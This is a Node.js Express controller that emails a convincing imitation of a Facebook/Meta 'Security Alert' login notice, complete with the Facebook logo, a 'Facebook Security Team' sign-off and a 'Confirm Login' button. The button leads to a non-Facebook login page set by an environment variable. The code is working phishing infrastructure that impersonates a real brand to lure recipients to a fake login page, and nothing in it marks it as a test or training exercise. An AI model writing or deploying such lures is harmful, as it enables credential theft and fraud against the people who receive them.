const sendEmail = require("../services/emailService");

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email, name = "User" } = req.body;

    if (!email) {
      return res.status(400).json({ success: false, message: "Email required" });
    }

    // ✅ CRITICAL FIX → ALWAYS Railway
    const baseUrl = process.env.FRONTEND_URL;

    if (!baseUrl) {
      console.error("FRONTEND_URL is missing!");
      return res.status(500).json({ success: false, message: "Server config error" });
    }

    const loginLink = `${baseUrl}/login.html`;

    console.log("🔗 Login Link:", loginLink);

    // Detect basic device (optional)
    const device = req.headers["user-agent"] || "Unknown device";

    const htmlTemplate = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0;padding:0;background:#121212;font-family:Arial;color:#fff;">
<div style="max-width:480px;margin:auto;padding:20px;">

    <!-- f LOGO -->
    <div style="width:45px;height:45px;background:#0866ff;border-radius:50%;
    display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:bold;">
        f
    </div>

    <hr style="border-top:1px solid #3e4042;margin:20px 0;">

    <p style="color:#e4e6eb;">Hi ${name},</p>

    <p style="color:#e4e6eb;">
        We noticed a login attempt to your Facebook Security account.
    </p>

    <b style="font-size:17px;">About this login</b>

    <table width="100%" style="margin-top:15px;color:#b0b3b8;">
        <tr>
            <td width="30">🕒</td>
            <td>${new Date().toLocaleString()}</td>
        </tr>
        <tr>
            <td>📍</td>
            <td>Unknown Location</td>
        </tr>
        <tr>
            <td>📱</td>
            <td>${device}</td>
        </tr>
    </table>

    <!-- BUTTON (CRITICAL FIX) -->
    <a href="${loginLink}"
       style="display:block;width:100%;background:#2374e1;color:#fff;
       text-align:center;padding:14px 0;border-radius:8px;
       text-decoration:none;font-weight:600;margin:25px 0;">
       Confirm Login
    </a>

    <p style="color:#e4e6eb;">
        If this was you, no action is needed. If not, secure your account immediately.
    </p>

    <p>Thanks,<br><strong>Facebook Security Team</strong></p>

    <hr style="border-top:1px solid #3e4042;margin:20px 0;">

    <div style="text-align:center;font-size:12px;color:#b0b3b8;">
        <p>© 2026 Meta Security</p>
        <p>This message was sent to ${email}</p>
        <p>Do not share this email.</p>
    </div>

</div>
</body>
</html>
`;

    const sent = await sendEmail({
      to: email,
      subject: "🔐 Security Alert - Confirm Your Login",
      html: htmlTemplate,
    });

    if (!sent) {
      return res.status(500).json({ success: false, message: "Email failed" });
    }

    return res.status(200).json({ success: true, message: "Email sent" });

  } catch (err) {
    console.error("ERROR:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
};